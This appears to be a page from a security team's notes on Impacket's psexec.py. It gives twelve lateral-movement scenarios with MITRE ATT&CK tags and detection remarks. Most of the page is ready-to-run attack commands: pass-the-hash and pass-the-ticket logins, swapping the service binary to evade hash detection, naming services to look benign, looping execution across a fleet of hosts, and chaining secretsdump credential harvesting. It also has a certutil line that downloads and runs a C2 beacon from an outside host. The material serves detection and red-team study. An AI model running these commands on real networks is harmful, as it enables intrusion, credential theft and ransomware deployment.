# Impacket — psexec.py — Hands-On Use Cases

Every scenario below produces the same underlying protocol sequence documented in `01 - Overview.md` §How It Works — what changes is the credential material, what gets executed, and how much the operator tries to blend in. MITRE ATT&CK technique(s) are tagged per scenario since the *combination* of techniques in play shifts depending on the variant (e.g. adding pass-the-hash layers `T1550.002` on top of the baseline `T1021.002`/`T1569.002`).

## Contents
- [Interactive SYSTEM Shell via Cleartext Credentials](#interactive-system-shell-via-cleartext-credentials)
- [Pass-the-Hash](#pass-the-hash)
- [Pass-the-Ticket (Kerberos)](#pass-the-ticket-kerberos)
- [Kerberos with an AES Key or Keytab](#kerberos-with-an-aes-key-or-keytab)
- [One-Off, Non-Interactive Command Execution](#one-off-non-interactive-command-execution)
- [Uploading and Running a Custom Local Tool](#uploading-and-running-a-custom-local-tool)
- [Swapping the Service Binary to Evade Hash Detection](#swapping-the-service-binary-to-evade-hash-detection)
- [Blending In with Custom Service and Binary Names](#blending-in-with-custom-service-and-binary-names)
- [Fleet-Wide / Mass Execution](#fleet-wide--mass-execution)
- [Alternate Port or Direct-IP Targeting](#alternate-port-or-direct-ip-targeting)
- [Staging a Secondary C2 Payload](#staging-a-secondary-c2-payload)
- [Chained Use After Credential Harvesting](#chained-use-after-credential-harvesting)

---

## Interactive SYSTEM Shell via Cleartext Credentials

**MITRE ATT&CK:** [T1021.002](https://attack.mitre.org/techniques/T1021/002/) (Remote Services: SMB/Windows Admin Shares) · [T1569.002](https://attack.mitre.org/techniques/T1569/002/) (System Services: Service Execution) · [T1059.003](https://attack.mitre.org/techniques/T1059/003/) (Command and Scripting Interpreter: Windows Command Shell)

The baseline case — every other scenario in this note is a variation on this one.

```bash
# 1. (optional) confirm creds are valid + local-admin before touching the target
netexec smb 10.10.10.5 -u 'jsmith' -p 'Summer2026!' --local-auth

# 2. Get a SYSTEM shell
psexec.py 'CORP/jsmith:Summer2026!@10.10.10.5'
```
Lands directly in `C:\Windows\system32>` as `NT AUTHORITY\SYSTEM` — the shell *is* the lateral movement; no further step is needed to reach code execution.

## Pass-the-Hash

**MITRE ATT&CK:** [T1550.002](https://attack.mitre.org/techniques/T1550/002/) (Use Alternate Authentication Material: Pass the Hash), plus the baseline T1021.002/T1569.002

```bash
# LM hash unknown/blank -> use the standard blank-LM placeholder
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  CORP/administrator@10.10.10.5
```
No cleartext password needed — the NT hash alone (recovered from `secretsdump.py`, Mimikatz, or a DCSync) is sufficient for NTLM authentication.

## Pass-the-Ticket (Kerberos)

**MITRE ATT&CK:** [T1550.003](https://attack.mitre.org/techniques/T1550/003/) (Use Alternate Authentication Material: Pass the Ticket) · T1021.002

```bash
# Prereqs: hostname (not bare IP) must resolve, clock skew < 5 min from the DC
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass CORP/administrator@dc01.corp.local
```
Kerberos auth requires the target's **FQDN**, since the ticket was issued against an SPN (`CIFS/dc01.corp.local`) — a bare IP fails Kerberos and Impacket will silently fall back to NTLM unless `-k` is forced.

## Kerberos with an AES Key or Keytab

**MITRE ATT&CK:** T1550.003 · T1021.002 — quieter variant, avoids NTLM entirely

```bash
# AES key (128 or 256-bit) instead of a password/RC4 material
psexec.py -k -no-pass -aesKey <256-bit-aes-key-hex> CORP/svc-backup@dc01.corp.local

# Or: authenticate a service account straight from a keytab
psexec.py -k -no-pass -keytab svc-backup.keytab CORP/svc-backup@dc01.corp.local
```
Common for **service-account** abuse specifically — service accounts are frequently configured with keytabs or long-lived AES keys rather than interactively-typed passwords, and this path never generates the weaker RC4/NTLM authentication traffic that some detections specifically watch for.

## One-Off, Non-Interactive Command Execution

```bash
psexec.py CORP/jsmith:Summer2026!@10.10.10.5 "whoami /all"
```
The full protocol sequence (drop → create service → start → pipe I/O → cleanup) still runs for a single command — useful for scripted execution across many hosts rather than a live interactive session (see [Fleet-Wide / Mass Execution](#fleet-wide--mass-execution) below).

## Uploading and Running a Custom Local Tool

**MITRE ATT&CK:** T1569.002, plus [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer)

```bash
psexec.py -c ./enum.exe CORP/jsmith:Summer2026!@10.10.10.5 -arg1 -arg2
```
`-c` uploads a **second, independent file** — distinct from the RemCom service binary that always gets dropped regardless. This is how operators run a custom recon script, a credential-dumping binary, or anything else that isn't `cmd.exe`, directly through the same SMB/service channel. Forensically this means **two dropped files with two separate footprints** on the target (see `04 - Target Evidence.md`).

## Swapping the Service Binary to Evade Hash Detection

```bash
psexec.py -file /opt/tools/custom_remcom.exe CORP/jsmith:Summer2026!@10.10.10.5
```
The single most important operational-security variant in this note: `-file` replaces Impacket's bundled, hash-consistent RemCom binary with an operator-supplied one. **This breaks the "the dropped binary's hash is a durable IOC" assumption** documented in `04 - Target Evidence.md` — a well-resourced operator can recompile or repack the RemCom-compatible service binary per engagement specifically to defeat hash-based hunting. It does **not**, however, change the named-pipe protocol (`RemCom_communicaton` and friends are hard-coded in Impacket's *client*-side expectations, not the uploaded binary) — see the hunting-priority note in `05 - Detection and Hunting.md`.

## Blending In with Custom Service and Binary Names

```bash
psexec.py -service-name "WindowsUpdateSvc" -remote-binary-name "svchost_helper.exe" \
  CORP/jsmith:Summer2026!@10.10.10.5
```
Operator-chosen names make the Event ID 7045 entry and the dropped-file path *look* more benign at a glance — but the underlying event sequence, pipe names, and (unless `-file` is also used) the file hash are unaffected. Naming-pattern hunts (e.g. "4 random letters") are the **weakest** of the invariants covered in `05 - Detection and Hunting.md` precisely because this flag exists.

## Fleet-Wide / Mass Execution

```bash
# Scripted across a target list — common for password-spray validation,
# IOC sweeps, or (on the attacker side of a real intrusion) ransomware deployment
for ip in $(cat targets.txt); do
  echo "[*] $ip"
  psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
    CORP/administrator@"$ip" "whoami" 2>&1 | tee -a results.log
done
```
This is the shape real ransomware affiliates use when they've obtained Domain Admin-equivalent credentials and need to push an encryptor to every reachable host in a short window — a burst of near-simultaneous Event ID 7045 entries with the *same* random-name pattern (or the same custom name, if `-service-name` is fixed across the loop) across many hosts in a tight time window is a strong ransomware-deployment indicator at the fleet level, distinct from a single-host lateral-movement event.

## Alternate Port or Direct-IP Targeting

```bash
# Legacy NetBIOS port, e.g. if 445 is filtered but 139 isn't
psexec.py -port 139 CORP/jsmith:Summer2026!@10.10.10.5

# Force a specific IP when DNS is unreliable/segmented but the hostname is still
# needed for Kerberos SPN resolution
psexec.py -k -target-ip 10.10.10.5 CORP/administrator@dc01.corp.local
```

## Staging a Secondary C2 Payload

**MITRE ATT&CK:** T1569.002, plus whichever technique the staged payload represents (e.g. T1105 Ingress Tool Transfer)

```bash
psexec.py CORP/jsmith:Summer2026!@10.10.10.5 \
  "cmd /c certutil -urlcache -f http://198.51.100.7/beacon.exe C:\Windows\Temp\svc.exe && C:\Windows\Temp\svc.exe"
```
`psexec.py` is frequently a **means to an end** — the SYSTEM shell is used to pull down and launch a C2 implant (Sliver, Cobalt Strike, etc.), at which point the target evidence trail in `04 - Target Evidence.md` gains a second, independent layer (the staged payload's own footprint) on top of psexec's own.

## Chained Use After Credential Harvesting

This is the canonical Impacket workflow — `psexec.py` is rarely the *first* tool run in an intrusion; it's usually the payoff step after credential material was harvested by a sibling Impacket script.

```bash
# 1. Dump local SAM hashes from an already-compromised host
secretsdump.py CORP/jsmith:Summer2026!@10.10.10.20 -sam -system

# 2. Immediately reuse a recovered local admin hash to move to the next host
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<recovered-nt-hash> \
  Administrator@10.10.10.21
```
Recognizing this **chain** — not just the individual tool — is what separates a fast, high-confidence detection from a slow one: a `secretsdump.py`-shaped access pattern against one host followed within minutes by a `psexec.py`-shaped Event 7045 against a *different* host, using the *same source IP*, is a textbook Impacket lateral-movement chain.
